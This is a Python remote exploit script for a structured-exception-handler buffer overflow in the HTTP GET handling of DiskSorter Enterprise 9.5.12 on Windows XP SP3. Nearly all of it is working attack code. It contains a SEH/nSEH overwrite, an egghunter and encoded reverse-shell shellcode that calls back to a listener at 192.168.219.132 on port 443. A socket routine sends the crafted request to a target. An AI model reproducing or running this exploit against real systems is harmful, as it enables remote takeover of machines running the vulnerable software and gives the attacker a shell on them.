# Exploit Title : DiskSorterEnterprise HTTP GET BOF Structrued Exception Handler
# Exploit Type : Remote
# Version: 9.5.12
# Windows XP SP3 x86

import socket

host = "192.168.219.161"
port = 80

#Bad Chars Identified \x00 \x09 \x0A \x0D \x20

#POP POP RETN
SEH = '\xb4\x12\x05\x10'

#JUMP SHORT 
nSEH = '\x90\x90\xEB\x05'

egghunter =  "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x6e\x69\x6a\x6f\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#windows/shell_reverse_tcp LHOST=192.168.219.132 LPORT=443 EXITFUNC=thread
shellcode =  ""
shellcode += "\xbd\xfe\x22\xe6\xca\xdb\xc4\xd9\x74\x24\xf4\x5e"
shellcode += "\x31\xc9\xb1\x58\x83\xee\xfc\x31\x6e\x11\x03\x6e"
shellcode += "\x11\xe2\x0b\x99\x6d\x5a\x68\x7d\xa8\xad\x57\xf6"
shellcode += "\x6f\xa6\x3d\xde\xa6\xf7\x93\xa3\xfb\xfc\x22\xfe"
shellcode += "\xf5\xff\x95\x60\x70\x56\x0c\xeb\x7c\xcf\xcf\x94"
shellcode += "\xe3\xe3\x0b\x2d\x43\x44\x5e\xb8\x94\x48\x63\x3c"
shellcode += "\x4f\x0f\xd4\xdd\xc1\xdd\xa2\xc8\x19\x76\x25\x53"
shellcode += "\x14\x0e\x5f\xb7\x13\xd3\x27\xdd\x1c\xfb\xae\x8f"
shellcode += "\xd8\x25\x7b\x3b\x6d\x99\xa0\x03\x41\x69\x06\x06"
shellcode += "\x99\xa6\x23\x25\xfa\xb2\x33\xf5\x47\xe9\xd8\x85"
shellcode += "\x0e\x4d\x5d\x44\x9d\x64\x59\x46\xed\x21\x71\xf3"
shellcode += "\x81\x37\x54\xb7\xe1\x6e\x44\xcb\x99\xa3\x02\xac"
shellcode += "\x63\x8a\x7b\x47\xbe\x41\x52\xf5\xd4\xc2\x31\x5a"
shellcode += "\xad\xf8\x67\x36\x66\x8d\xaf\xc8\x4e\x38\xfc\xa4"
shellcode += "\x0c\x9b\x91\xb1\x85\x64\xa2\xf5\x6a\x84\xa2\x2d"
shellcode += "\xcf\xa6\x4a\xbd\x14\x63\x51\xff\x65\x24\x03\x56"
shellcode += "\xc6\xb0\x13\xf0\x9c\xc8\x88\x6b\x95\xf4\x6d\x06"
shellcode += "\xa8\x19\x45\xf0\x81\x8f\x0f\x26\xfd\x95\xac\xc5"
shellcode += "\x82\x23\xa9\xc9\x2e\x56\x96\x26\x49\x58\x23\xfa"
shellcode += "\x78\x68\xc8\xdf\xfe\x17\x3f\x8c\x02\x9c\x25\xaa"
shellcode += "\x6a\xb5\xb8\xd3\xca\x34\x08\x61\xdc\x05\xa8\xfe"
shellcode += "\x67\x4e\x12\x1c\xf5\xe3\xaf\x94\x11\x68\x3a\x83"
shellcode += "\xc1\x92\x34\xbf\xa3\x33\xb1\x62\xd7\xf8\xac\xb1"
shellcode += "\x84\x9b\x89\x47\x40\xad\xfa\xb0\x68\x13\xeb\x96"
shellcode += "\x77\xe4\x4b\x28\xad\x75\x87\xe4\x01\x4d\x85\xda"
shellcode += "\x91\xb5\xff\xc8\x4b\x3e\x28\x70\xd9\xe9\x11\xcb"
shellcode += "\xb7\x1d\x2e\xc2\x36\x7c\x3d\x3a\xc3\x84\x7a\x37"
shellcode += "\x64\x4a\x0b\x02\x1e\x84\xda\xc1\xd6\x83\xe9\x07"
shellcode += "\xb9\x32\x5b\x03\xe1\x3d\x68\xa2\x36\x39\x60\x35"
shellcode += "\x3e\xa0\x46\xba\x2e\x57\x19\x6f\xac\x6c\x7f\x81"
shellcode += "\xb5\x3b\xd1\xeb\xb8\xe3\xf6\x63\xff\x83\x38\x9e"
shellcode += "\xd4\x59\x0e\x0f\x01\x6e"

exp = 'njoffsec' * 310 + 'njpwned' + nSEH + SEH + '\x90' * 8  + egghunter + '\x90' * 12 + 'nijonijo' + shellcode + '\x90' * 8 + 'njoffsec' * 757 + 'njo'

request = "GET /" + exp + "HTTP/1.1" + "\r\n"
request += "Host: " + host + "\r\n"
request += "User-Agent:  Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.89 Safari/537.36" + "\r\n"
request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + "\r\n"
request += "Accept-Language: en-US,en;q=0.5" + "\r\n"
request += "Accept-Encoding: gzip, deflate" + "\r\n"
request += "Connection: keep-alive" + "\r\n\r\n"

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((host,port))
socket.send(request)
socket.close()

